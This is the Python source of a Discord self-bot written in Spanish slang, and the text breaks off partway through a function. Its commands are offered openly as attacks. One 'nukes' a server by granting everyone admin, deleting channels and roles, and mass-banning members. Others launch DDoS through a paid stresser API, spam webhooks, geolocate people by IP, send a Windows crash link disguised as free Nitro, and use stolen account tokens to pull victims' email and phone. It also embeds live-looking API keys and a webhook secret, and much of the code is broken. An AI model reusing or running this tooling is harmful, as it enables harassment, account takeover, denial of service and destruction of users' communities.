#Discord self bot python:

import datetime
from email import message
from io import StringIO
import logging
from aiohttp import client as req 
from discord import channel, client as req, message as req 
import asyncio  
import selfbot as req 
import random, string as req 
import urllib.request as req
from colorama import Fore, init
import base64 as req 
from datetime import datetime as req 
from discord import webhook as req
from discord import role as req
from discord import activity
from discord import user 
from discord.ext import commands, tasks
import json
from discord.ext.commands.bot import Bot
from discord.member import VoiceState 
from discord.role import Role as req 
from discum.RESTapiwrap import editedReqSession
from giphy_client import rest
import requests
from requests.models import codes 
from asyncio import tasks as req 
from inspect import formatannotation
from itertools import cycle as req
from logging import Formatter
import random as req
import colorsys as req
import time  
import aiohttp
import colorama as req 
import discord
from aiohttp import web as req
from discord import Permissions as req
from typing import ContextManager, Text as req, TypeVar 
from urllib.request import urlcleanup, urlopen
from discord import channel as req 
from discord import embeds as req
from discord import user as req 
import datetime 
from discord import colour as req
from colorama import Fore, Style as req
from discord import permissions
from discord import activity as req
from discord.activity import Streaming as req 
from discord.activity import Game as req  
from discord.enums import Status 
from discord.errors import ClientException  as req, DiscordException as req 
from discord.ext import commands
from discord.ext.commands import Bot as req 
import discord, json as req 
import discord.client
from discord.ext.commands.converter import ColorConverter as req 
from discord.ext.commands.core import command, has_permissions
from discord.ext.commands.errors import BotMissingPermissions as req, CommandError, NSFWChannelRequired as req 
from discord.user import ClientUser as req
from discord.webhook import Webhook as req 
import discum
import asyncio.tasks as req 
import asyncio as req 
import giphy_client
from discord.ext import commands, tasks as req 
from itertools import cycle
from giphy_client.rest import ApiException
import random
import aiohttp, requests, subprocess as req 
import sys as req 
from discord.ext import commands
import discord, os as req
import asyncio as req 
import discord.client
import colorama as req
import json, time
import datetime  as req  
from discord.ext.commands import MissingRequiredArgument as req 
from discord.ext.commands import CommandNotFound as req 
from colorama import Fore
from random import randint
import requests 


bot = commands.Bot(command_prefix="jabibi$", self_bot=True, status=discord.Status.idle)
bot.remove_command('help')

from discord.ext import tasks as req
from itertools import cycle


@bot.event
async def on_ready():
    print("SELFBOT ID OWNER> 839946682266681456")
    print("====================================")
    print("this bot was created by jabibi and the code was created by he in 2 weeks")
    print("====================================")
    print("============VAMOS JABIBI============")
    print("JABIBIIIIIIIIIIII TU BOT ESTA ACTIVO")
    print("====================================")
    print("Bot presence t u r n e d on ( ͡° ͜ʖ ͡°)")
    print("id del owner> ! 𝕵𝖆𝖇𝖎𝖇𝖎 𝖉𝖉𝖔𝕾シ✞ 🖤#6666")


def __init__(self, bot):
        self.bot = bot

@bot.command()
async def bin(ctx):
        """Shows basic info about the given bin number
        Note: Can only be used 10 times per 10 minutes
        Paramaters
        • bin - the fucking bin number
        """
        bin = message
        lookup = new_func(bin)
        with urlopen.request(lookup) as url:
            data = json.loads(url.read().decode())

        ### Parse json response
        sch = data["scheme"]
        type = data["type"]
        brand = data["brand"]
        prepd = data["prepaid"]
        country = data["country"]["name"]
        bankname = data["bank"]["name"]
        site = data["bank"]["url"]
        phone = data["bank"]["phone"]
        city = data["bank"]["city"]

        ### Make embed
        embed = discord.Embed(title=bin, color=0xFF0000)
        embed.set_author(name="Bin Lookup for")
        embed.set_thumbnail(url="https://i.imgur.com/E5YiHfL.png")
        embed.add_field(name="===============", value="===============", inline=False)
        embed.add_field(name="Scheme:", value=sch, inline=False)
        embed.add_field(name="Type:", value=type, inline=False)
        embed.add_field(name="Brand:", value=brand, inline=False)
        embed.add_field(name="Prepaid:", value=prepd, inline=False)
        embed.add_field(name="Country:", value=country, inline=False)
        embed.add_field(name="Bank:", value=bankname, inline=False)
        embed.add_field(name="Website:", value=site, inline=False)
        embed.add_field(name="Phone:", value=phone, inline=False)
        embed.add_field(name="City:", value=city, inline=False)
        embed.set_footer(text="Quite possibly the shittest selfbot made by Daddie#6969")

        await ctx.send(embed=embed)

def new_func(bin):
    lookup = "https://lookup.binlist.net/" + bin
    return lookup



#spam para canales
@bot.command(name='spam', help='PONES LAS VECES QUE QUIERAS HACER SPAM')
async def spam(ctx, amount:int, *, message):
    await ctx.message.delete()
    for i in range(50): # Do the next thing amount times
        await ctx.send(message) # Sends message where command was called

#comando personalizado mioo jaja de jabibi

@bot.command()
async def ping(ctx):
    await ctx.message.delete()
    before = time.monotonic()
    message = await ctx.send("Pinged!")
    ping = (time.monotonic() - before) * 1000
    await message.edit(content=f"💀👽JABIBI ESTE SERVER O CHAT PRIVADO TIENE DE PING!| `{int(ping)}ms' | 'Asi esta estO Jabibi!!`👽💀")
    
#comndo para memes hahah xd xd xd 
#send Meme from reddit command
@bot.command(pass_context=True)
async def meme(ctx):
  await ctx.message.delete()
  embed = discord.Embed(title="MEMES CREATED BY JABIBI HACKING", description="🤣DISFRUTALO TANTO COMO YO JABIBI", colour=0xFE0000)
  async with aiohttp.ClientSession() as cs:
    async with cs.get( 
     'https://www.reddit.com/r/memes/new.json?sort=hot') as r:
     res = await r.json()
    embed.set_image(url=res['data']['children'][random.randint(0, 25)]['data']['url'])
    await ctx.send(embed=embed)


@bot.command()
async def jabibi(ctx):
    channel = ctx.message.channel
    embed = discord.Embed( 
    title = ("👽👽SELF BOT BY JABIBI 👽👽"),
    description = ("😈BOT SELFBOT CREADO POR MI PARA CUENTA PERSONAL DE DISCORD😈"),
    image = ("https://cdn.discordapp.com/attachments/861504564285145108/866468039871168542/3d97bf7b-1dea-4a9e-9205-194cd9bcbebe.gif"),
    colour = discord.Colour.random(),
    )
    await channel.send(embed=embed)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/848250303731990528/864455612930719764/a_823a410a34c6ad38d417bafacee29c52.gif")
    embed.add_field("VAMOS A BEBER COÑOO", value="A BEBER CARAJOOO")
    embed.add_field("ESTE BOT YO LO CREE PORQUE ME DIO LA GANA", value="SI YO JABIBI HAHA")
    return await ctx.send(embed=embed)


#para scacarle el avatar a otro con @mention

@bot.command(name='avatar', help='fetch avatar of a user')
async def avatar(ctx, *, member: discord.Member = None):
    if not member:
        member = ctx.message.author
    userAvatar = member.avatar_url
    await ctx.send(userAvatar)

#simplecomando para ayuda o help

@bot.command()
async def help(ctx, category=None):
    await ctx.message.delete()
    channel = ctx.message.channel
    if category is None:
        embed = discord.Embed(colour = discord.Colour.random(), timestamp=ctx.message.created_at)
        embed.set_author(name="jabibihacking | prefix:  " + str(bot.command_prefix),
        icon_url="https://media.discordapp.net/attachments/848250303731990528/867144047037906984/a_f315e653ced8a67594a120e3c8ac4578.gif"
        )
        embed.set_image(url="https://cdn.discordapp.com/attachments/858594578143117332/868602065939750932/justbeingnamaste.gif")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/858594578143117332/868602065939750932/justbeingnamaste.gif")
        embed.add_field(name="\uD83E\uDDCA 'jabibi$help'", value="ES EL COMANDO PRINCIPAL", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$Embed'", value="ES PARA JUGAR CON EL COMANDO", inline=True)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$jabibi'", value="PARA INICIO DEL BOT", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$avatar y en servers con tag'", value="PARA SACAR AVATAR DE OTROS", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$resquests'", value="PARA CHECK", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$gif'", value="PARA ENVIAR GIFS RANDOM", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$getbanner'", value="PARA OBTENER EL BANNER DE OTRA PERSONA", inline=False)
        embed.add_field(name="\uD83E\uDDca 'jabibi$nsfw'", value="Solo para porno jajashhas xd totos ala vista ahha", inline=False)
        embed.add_field(name="\uD83E\uDDca 'jabibi$jabibimataservers'", value="COMANDO MUY PELIGOROS CREADO POR MI PARA DESTRUIR SERVERS Y PUEDES LLEGAR A TENER BAN POR DISCORD", inline=False)
        embed.add_field(name="\uD83E\uDDca 'jabibi$spam'", value="JABIBI SOLO PONE jabibi$spam 30 y el mensaje que desees", inline=False)
        embed.add_field(name="\uD83E\uDDca 'jabibi$ping'", value="es para saber el ping del server o de un chat privado", inline=False)
        embed.add_field(name="\uD83E\uDDca 'jabibi$meme'", value="para sacar memes jaja xd", inline=False)
        embed.add_field(name="\uD83E\uDDca 'jabibi$userinfo'", value="para sacar info de cuenta en un server", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$info'", value="PARA OBTENER INFO SOBRE MI", inline=True)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$ddos'", value="jabibi solo pon el ip de la persona,puerto normalmente el mejor es (80) y pones el numero de ataques", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$locate'", value="pones el ip para sober la locacion de la persona en DISCORD!!", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$serverinfo'", value="INFORMACION COMPLETA DEL SERVIDOR", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$ips'", value="sacar ips de otros o de servers", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$info'", value="MI PROPIA INFOMACION QUE PONGO DESDE MI CODE", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$clear'", value="para limpiar los mensaje", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$spamhook'", value="pones el link de webhook y lo que quieras que salga en el spam y checo la consola O CMD", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$infobot'", value=" Informacion del bot creado por mi", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$tokeninfo'", value="TOKEN GRABBER", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$bin'", value="Informacion de una tarjeta de credito💶", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$crash'", value="Para Partirme Y Crashearle La pc A Un Bruto Del DIAAAAAAABLO", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$userinfo'", value="Informacion mia desde un servidor no desde UN DM OK JABIBI?", inline=False)
        embed.add_field(name="\uD83E\uDDCA 'jabibi$GetAdmin'", value="para obtener admin a base de un rol", inline=False)
        embed.set_footer(text="CREATED BYJABIBI HACKING")
        await channel.send(embed=embed)
    elif str(category).lower() == "general":
        embed = discord.Embed(
        color=req.random(0x1000000),
        timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/858594578143117332/868602065939750932/justbeingnamaste.gif")


#para sacar info de otro en un server

@bot.command()
async def userinfo(ctx, *, user: discord.User = None): # b'\xfc'
    if user is None:
        user = ctx.author      
    date_format = "%a, %d %b %Y %I:%M %p"
    embed = discord.Embed(color=0xdfa3ff, description=user.mention)
    embed.set_author(name=str(user), icon_url=user.avatar_url)
    embed.set_thumbnail(url=user.avatar_url)
    embed.add_field(name="Joined", value=user.joined_at.strftime(date_format))
    members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
    embed.add_field(name="Join position", value=str(members.index(user)+1))
    embed.add_field(name="Registered", value=user.created_at.strftime(date_format))
    embed.add_field(name='User ID', value=user.id, inline=True)
    embed.add_field(name='Nick', value=user.nick, inline=True)
    embed.add_field(name='Status', value=user.status, inline=True)
    embed.add_field(name='Game', value=user.activity, inline=True)
    embed.add_field(name='Highest Role', value=discord.role, inline=True)
    embed.add_field(name='Account Created', value=user.created_at.__format__('%A, %d. %B %Y @ %H:%M:%S'))
    embed.add_field(name='Join Date', value=user.joined_at.__format__('%A, %d. %B %Y @ %H:%M:%S'))
    embed.set_author(name=user, icon_url='https://i.imgur.com/RHagTDg.png')
    if len(user.roles) > 1:
        role_string = ' '.join([r.mention for r in user.roles][1:])
        embed.add_field(name="Roles [{}]".format(len(user.roles)-1), value=role_string, inline=False)
    perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
    embed.add_field(name="Guild permissions", value=perm_string, inline=False)
    embed.set_footer(text='ID: ' + str(user.id))
    embed.set_footer(text="CREATED BYJABIBI HACKING: ID:"  + str(user.id))
    return await ctx.send(embed=embed)

#para joder hahaha

@bot.command()
async def Embed(ctx, title, *, description):
    await ctx.message.delete()
    embed=discord.Embed(title=title, description=description)
    await ctx.send(embed=embed)

#para hacer resquest 

@bot.command()
async def resquest(ctx):
    r = requests.get('https://google.com')
    print(r.status_code)

#para sacar gifs totlamente randoms

@bot.command()
async def gif(ctx,*,q="Smile"):

    api_key ='drzkW9w16u806kCspIeATNjFRQjpj6oO'
    api_instance = giphy_client.DefaultApi()

    try:

        api_responde = api_instance.gifs_search_get(api_key, q, limit=5, rating='g')
        lst = list(api_responde.data)
        giff = random.choice(lst)


        emb = discord.Embed(title=q)
        emb.set_image(url=f'https://media.giphy.com/media/{giff.id}/giphy.gif')
        
        await ctx.channel.send(embed=emb)
        
    except ApiException as e:
        print("Exception when calling Api")
        

#para obtener el banner de otro

@bot.command(description="Get the guild banner image")
async def getbanner(ctx):
    await ctx.send()
    """Get the guild banner image."""
    if ctx.message.guild is None:
        return
    await ctx.send(ctx.message.guild.banner_url)

# commando para poorno ajja jabibi que te pasa? 



# Setting `Streaming ` status

@bot.command()
async def nsfw(ctx):
    if ctx.channel.is_nsfw():
        embed = discord.Embed(title="JABIBI UYY JAMETE KUDASAII ", colour = discord.Colour.random())
    async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/nsfw/new.json?sort=hot') as r:
            res = await r.json()
            embed.set_image(url=res['data']['children'] [random.randint(0, 25)]['data']['url'])
            embed.set_footer(text="CREATEDBYJABIBI")
            await ctx.send(embed=embed)
            await ctx.send("||🔥Oh Yess Daddy Jabibi🔥||")

#destruir servers 

@bot.command()
async def jabibimataservers(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("! 𝕵𝖆𝖇𝖎𝖇𝖎 𝖉𝖉𝖔𝕾シ✞ 🖤#6666")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("😂JABIBI?😂")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice('SPAM_CHANNEL'))
    print(f"Nuked {guild.name} Successfully.")
    return

#server infomacion 

@bot.command()
async def serverinfo(ctx):
    await ctx.message.delete()
    if (
            isinstance(ctx.channel, discord.DMChannel)
            or isinstance(ctx.channel, discord.GroupChannel) or
            ctx.message.guild.unavailable
    ):
        return
    server = ctx.message.guild
    online = 0
    for user in server.members:
        if str(user.status) in ['online', 'idle', 'dnd']:
            online += 1
    users = []
    for user in server.members:
        users.append(f'{user.name}#{user.discriminator}')
    users.sort()
    all_users = '\n'.join(users)
    text_channels = len([x for x in server.channels if type(x) == discord.channel.TextChannel])
    voice_channels = len([y for y in server.channels if type(y) != discord.channel.TextChannel])

    b = "\n".join([f'{m.name}#{m.discriminator}' for m in server.premium_subscribers])
    boosters = f'```{b}```' if b else 'No Boosters'
    embed = discord.Embed(title=f" **{server.name}'s Info** ", description=f"", colour = discord.Colour.random(),
                          timestamp=ctx.message.created_at)
    embed.add_field(name="**Owner**", value=f"{ctx.guild.owner}", inline=True)
    embed.add_field(name="**Name**", value=f"{server.name}", inline=True)
    embed.add_field(name="**ID**", value=f"{server.id}", inline=True)
    embed.add_field(name="**Members**", value=f"{server.member_count}", inline=True)
    embed.add_field(name="**Online**", value=f"{online}", inline=True)
    embed.add_field(name="**Text Channels**", value=f"{text_channels}", inline=True)
    embed.add_field(name="**Region**", value=f"{server.region}", inline=True)
    embed.add_field(name="**Verification**", value=f"{server.verification_level}", inline=True)
    embed.add_field(name="**Highest Role**", value=f"{server.roles[-1]}", inline=True)
    embed.add_field(name="**Role Count**", value=f"{len(server.roles)}", inline=True)
    embed.add_field(name="**Emoji Count**", value=f"{len(server.emojis)}", inline=True)
    embed.add_field(name="**Created**", value=f"{server.created_at.__format__('%A, %d. %B %Y @ %H:%M:%S')}",
                    inline=True)
    embed.add_field(name="**Boosters**", value=f"{boosters}", inline=True)
    embed.add_field(name="**Boosters**", value=f"{boosters}", inline=True)
    embed.set_thumbnail(url="https://cdn.discordapp.com/avatars/839946682266681456/a_7888748ee4922cf9752938fc8afbb842.gif?size=1024")
    embed.set_footer(text="CREATED BYJABIBI HACKING: ID:"  + str(user.id))
    await ctx.send(embed=embed)

#sacar ip de otro

@bot.command()
async def ips(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Discord IP Creado By Jabibi", colour = discord.Colour.random())
    embed.add_field(name="Europe IP's",
                    value=f"188.122.76.15\n5.200.6.155\n188.122.88.143\n5.200.14.187\n5.200.14.248\n", inline=True)
    embed.add_field(name="Russia IP's",
                    value=f"188.122.83.114\n188.122.83.61\n188.122.83.44\n188.122.83.101\n188.122.83.53\n", inline=True)
    embed.add_field(name="Dubai IP'S",
                    value=f"185.179.203.235\n185.179.203.233\n185.179.203.234\n185.179.203.231\n185.179.203.232\n",
                    inline=True)
    embed.add_field(name="US East IP's",
                    value=f"162.244.54.107\n213.179.197.205\n213.179.197.39\n213.179.197.198\n213.179.197.233\n",
                    inline=True)
    embed.add_field(name="US Central IP's",
                    value=f"138.128.142.26\n138.128.141.90\n138.128.142.34\n138.128.141.112\n138.128.142.91\n",
                    inline=True)
    embed.set_footer(text="CREATED BYJABIBI HACKING: ID")
    await ctx.send(embed=embed)


#localizacion tuya o de otro

@bot.command()
async def locate(ctx, ip: str):
    await ctx.message.delete()
    r = requests.get(url=f"http://ip-api.com/json/{ip}")
    vpn = requests.get(f"https://api.c99.nl/proxydetector?key=MZFG2-EOVK4-TCAB0-4UXP9&ip={ip}").text.replace("<br>",
                                                                                                             "\n")
    if vpn == "No proxy detected.":
        vpn = "False"
    else:
        vpn = "True"
    if r.status_code == 200:
        if (r.json()['status'] == "fail"):
            await ctx.send(f"{ip} is an **invalid** IP Address")
        else:
            flag = f":flag_{r.json()['countryCode'].lower()}:"
            embed = discord.Embed(title=f"**{ip}** lookup!", description=ip, colour = discord.Colour.random())
            embed.add_field(name="Country", value=f"{flag} {r.json()['country']}", inline=True)
            embed.add_field(name="Region", value=f"{r.json()['region']} / {r.json()['regionName']}", inline=True)
            embed.add_field(name="City", value=f"{r.json()['city']}", inline=True)
            embed.add_field(name="ZIP", value=f"{r.json()['zip']}", inline=True)
            embed.add_field(name="Lat/Long", value=f"{r.json()['lat']}/{r.json()['lon']}", inline=True)
            embed.add_field(name="ISP", value=f"{r.json()['isp']}", inline=True)
            embed.add_field(name="Org", value=f"{r.json()['org']}", inline=True)
            embed.add_field(name="VPN?", value=f"{vpn}", inline=True)
            await ctx.send(embed=embed)

#webhook spam 

@bot.command()
async def spamhook(ctx, webhook, message):
    embed = discord.Embed(title="Webhook Spammer POR Jabibi", description="Check console", colour = discord.Colour.random())
    await ctx.send(embed=embed, delete_after=25)
    webhook = "https://discord.com/api/webhooks/867049659264008212/z1o65lBm2O3qW6hLTVcGTCyIB0mAtq7gI9nc9_cdT7XOiTJZj9ozgEYCwCL_POEHGUyH"
    print("=============================")
    print("=====JABIBI WEBHOOK SPAM=====")
    print("=============================")
    loop = input("How many loops => ")
    if "+" in message:
        message = message.replace('+', ' ')

    data = {
        "content": message
    }
    for x in range(0, int(loop)):
        web = requests.post(webhook, data=data)
    embed = discord.Embed(title="Webhook Spam Por Jabibi", description="Done", colour = discord.Colour.random())
    await ctx.send(embed=embed, delete_after=25)


@bot.command()
async def lookup(ctx, player):
    await ctx.message.delete()
    main = requests.get(
        "https://www.roblox.com/search/users/results?keyword={}&maxRows=1&startIndex=0".format(player)).text
    dump = json.loads(main)
    for request in dump:
        try:

            embed = discord.Embed(title="**RoLookup**", description="", colour = discord.Colour.random())
            embed.add_field(name="Username", value=f"{dump['UserSearchResults'][0]['DisplayName']}", inline=True)
            embed.add_field(name="Userid", value=f"{str(dump['UserSearchResults'][0]['UserId'])}", inline=True)
            # print(request['UserSearchResults'][0]['UserId'])
            if dump['UserSearchResults'][0]['Blurb'] == "":
                embed.add_field(name="BIO", value=f"NO BIO")
            else:
                embed.add_field(name="BIO", value=f"{dump['UserSearchResults'][0]['Blurb']}")

            image = requests.get(
                f"https://thumbnails.roblox.com/v1/users/avatar-headshot?size=60x60&format=png&userIds={dump['UserSearchResults'][0]['UserId']}&userIds={dump['UserSearchResults'][0]['UserId']}").text
            imagedump = json.loads(image)
            embed.set_thumbnail(url=imagedump['data'][0]['imageUrl'])
            embed.set_footer(text="Made By Nano <3 https://github.com/X-x-X-0/rolookup/")
            print(f"Username " + dump['UserSearchResults'][0]['DisplayName'])
            print(f"Userid " + str(dump['UserSearchResults'][0]['UserId']))
            print(f"BIO " + dump['UserSearchResults'][0]['Blurb'])
            print(f"Image " + imagedump['data'][0]['imageUrl'])

            await ctx.send(embed=embed, delete_after=10)
            return

        except Exception as e:
            # print(e)
            embed = discord.Embed(title="**Error**", description=f"having issues getting {player}, check console")
            await ctx.send(embed=embed)
            return


@bot.command()
async def ddos(ctx, ip, port, time):
    dd = requests.get(
        "https://sunstresser.com/source/api/api.php?key=4RhPJe0AabVhNkzJ&host={}&port={}&time={}&method=XMAS&totalservers=2&vip=0".format(
            ip, port, time))
    embed = discord.Embed(title="👽JABIBI DDOS ATTACK👽", colour = discord.Colour.random())
    embed.add_field(name="IP", value=f"{ip}", inline=True)

    embed.add_field(name="Port", value=f"{port}", inline=True)

    embed.add_field(name="Time", value=f"{time}", inline=True)

    embed.add_field(name="Method", value="DDOS ATTACK OF DENEGATION OF SERVICE'S", inline=False)

    embed.set_footer(text="CREATED BYJABIBI HACKING")
    await ctx.send(embed=embed)

#info 
@bot.command()
async def info(ctx):
    description = """
  __**JABIBI INFFORMACION**__
-| JABIBI INFORMACION OTORGADA POR MI
-| YouTube>https://www.youtube.com/channel/UCc5vZ7dcLBJu-P1oXWF5AkA
-| discord Nitro> True
-| Github Account> None por el momento
-| Twitter info> https://twitter.com/YoJabii
-| Instagram info? https://www.instagram.com/jabibi_baby23/
-| Phone Number For Whatsapp> PIDEMELO CARAJO UTE TA LOCO
            <<Created by jabibi>>
    """
    embed = discord.Embed(title="jabibi Selfbot", description=description, colour = discord.Colour.random())
    embed.set_image(url="https://cdn.discordapp.com/attachments/858594578143117332/866676205624361010/2abd3c56-45c9-4aa7-91a6-63f5200d31ba.gif")
    embed.add_field(name="\uD83E\uDDCA 'jabibi$info'", value="PARA OBTENER INFO SOBRE MI", inline=True)
    embed.set_footer(text=f"Discord v{discord.__version__}")
    await ctx.send(embed=embed)


@bot.command()
async def clear(ctx):
    async for msg in ctx.channel.history().filter(lambda message: message.author.id == bot.user.id):
            if bot.is_ws_ratelimited == 0:
                print(f'looks like we are getting ratelimited slowing tasks down...')
                await asyncio.sleep(0.1)

                await msg.delete()

                embed = discord.Embed(title=f"**Cleaned Messages**", colour = discord.Colour.random())
                await ctx.send(embed=embed, delete_after=8)

@bot.command()
async def status(bot):
    gamename = '🥺Streaming🔥'
    while not bot.is_closed():
        if bot.is_ready():
            if bot.gamename:
                if bot.gamename != gamename:
                    logging.info('Game changed to playing {}'.format(bot.gamename))
                    gamename = bot.gamename
                game = discord.Game(name=bot.gamename)
            else:
                if bot.gamename != gamename:
                    logging.info('Removed Game Status')
                    gamename = bot.gamename
                game = None
            await bot.change_presence(game=game, status=discord.Status.invisible, afk=True)
        await asyncio.sleep(20)

class Userinfo:
    
    def __init__(self, bot):
        self.bot = bot

class Userinfo:
    
    def __init__(self, bot):
        self.bot = bot
@bot.command(invoke_without_command=True, aliases=['user', 'uinfo', 'infouser', 'ui'])
async def userinfoo(self, ctx, *, name=""):
        """Get user info. Ex: [p]info @user"""
        if ctx.invoked_subcommand is None:

            if name:
                try:
                    user = ctx.message.mentions[0]
                except IndexError:
                    user = ctx.guild.get_member_named(name)
                if not user:
                    user = ctx.guild.get_member(int(name))
                if not user:
                    user = self.bot.get_user(int(name))
                if not user:
                    await ctx.send(self.bot.bot_prefix + 'Could not find user.')
                    return
            else:
                user = ctx.message.author

            if user.avatar_url_as(static_format='png')[54:].startswith('a_'):
                avi = user.avatar_url.rsplit("?", 1)[0]
            else:
                avi = user.avatar_url_as(static_format='png')
            if isinstance(user, discord.Member):
                role = user.top_role.name
                if role == "@everyone":
                    role = "N/A"
                voice_state = None if not user.voice else user.voice.channel
                em = discord.Embed(timestamp=ctx.message.created_at, colour=0x708DD0)
                em.add_field(name='User ID', value=user.id, inline=True)
                if isinstance(user, discord.Member):
                    em.add_field(name='Nick', value=user.nick, inline=True)
                    em.add_field(name='Status', value=user.status, inline=True)
                    em.add_field(name='In Voice', value=voice_state, inline=True)
                    em.add_field(name='Game', value=user.activity, inline=True)
                    em.add_field(name='Highest Role', value=role, inline=True)
                em.add_field(name='Account Created', value=user.created_at.__format__('%A, %d. %B %Y @ %H:%M:%S'))
                if isinstance(user, discord.Member):
                    em.add_field(name='Join Date', value=user.joined_at.__format__('%A, %d. %B %Y @ %H:%M:%S'))
                em.set_thumbnail(url=avi)
                em.set_author(name=user, icon_url='https://i.imgur.com/RHagTDg.png')
                await ctx.send(embed=em)
            else:
                if isinstance(user, discord.Member):
                    msg = '**User Info:** ```User ID: %s\nNick: %s\nStatus: %s\nIn Voice: %s\nGame: %s\nHighest Role: %s\nAccount Created: %s\nJoin Date: %s\nAvatar url:%s```' % (user.id, user.nick, user.status, user.activity, req, user.created_at.__format__('%A, %d. %B %Y @ %H:%M:%S'), user.joined_at.__format__('%A, %d. %B %Y @ %H:%M:%S'), avi)
                else:
                    msg = '**User Info:** ```User ID: %s\nAccount Created: %s\nAvatar url:%s```' % (user.id, user.created_at.__format__('%A, %d. %B %Y @ %H:%M:%S'), avi)
                await ctx.send(self.bot.bot_prefix + msg)

            await ctx.message.delete()


@bot.command()
async def crash(ctx):
    """Sends a link when clicked rapes a windwos computer"""
    await ctx.message.delete()
    await ctx.send("Click this for free nitro! <ms-cxh-full://0>")


@bot.command()
async def tokeninfo(ctx):
        """Grabs info about selected user
        Paramaters
        • token - token of the selected user
        """
        token = message
        await ctx.message.edit(content="JABIBI ESTA ATACANDO...")

        try:
            headers = {"Authorization": token, "Content-Type": "application/json"}
            ### attempt login
            res = requests.get(
                "https://discordapp.com/api/v6/users/@me", headers=headers
            )

            if res.status_code == 200:  # code 200 if valid
                print(
                    f"{Fore.GREEN}[-] {Fore.RESET}Token is valid attemptig to grab info..."
                )

                ##############################
                # JABIBI ATACA A TODOS       #
                # JABIBI IS TEH BEST         #
                # JABIBI GOT CHU CARECULO    #
                #                            #
                ##############################

                ### Defines languages for getting locales but in english and not
                ### This shitty ass en-GB shit
                languages = {
                    "da": "Danish, Denmark",
                    "de": "German, Germany",
                    "en-GB": "English, United Kingdom",
                    "en-US": "English, United States",
                    "es-ES": "Spanish, Spain",
                    "fr": "French, France",
                    "hr": "Croatian, Croatia",
                    "lt": "Lithuanian, Lithuania",
                    "hu": "Hungarian, Hungary",
                    "nl": "Dutch, Netherlands",
                    "no": "Norwegian, Norway",
                    "pl": "Polish, Poland",
                    "pt-BR": "Portuguese, Brazilian, Brazil",
                    "ro": "Romanian, Romania",
                    "fi": "Finnish, Finland",
                    "sv-SE": "Swedish, Sweden",
                    "vi": "Vietnamese, Vietnam",
                    "tr": "Turkish, Turkey",
                    "cs": "Czech, Czechia, Czech Republic",
                    "el": "Greek, Greece",
                    "bg": "Bulgarian, Bulgaria",
                    "ru": "Russian, Russia",
                    "uk": "Ukranian, Ukraine",
                    "th": "Thai, Thailand",
                    "zh-CN": "Chinese, China",
                    "ja": "Japanese",
                    "zh-TW": "Chinese, Taiwan",
                    "ko": "Korean, Korea",
                }

                res_json = res.json()

                ### Convert json response to args we can fucking use
                user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                user_id = res_json["id"]
                avatar_id = res_json["avatar"]
                avatar_url = (
                    f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif"
                )
                phone_number = res_json["phone"]
                email = res_json["email"]
                mfa_enabled = res_json["mfa_enabled"]
                flags = res_json["flags"]
                locale = res_json["locale"]
                verified = res_json["verified"]

                ### Takes locale shit from earlier and converts into e.g Bulgarian, Bulgaria
                language = languages.get(locale)
                creation_date = datetime.utcfromtimestamp(
                    ((int(user_id) >> 22) + 1420070400000) / 1000
                ).strftime("%d-%m-%Y %H:%M:%S UTC")

                ### By default assume no nitro
                has_nitro = True

                print(
                    f"{Fore.GREEN}[-] {Fore.RESET}Initial account checks done\n{Fore.GREEN}[-] {Fore.RESET}Attempting to grab nitro information"
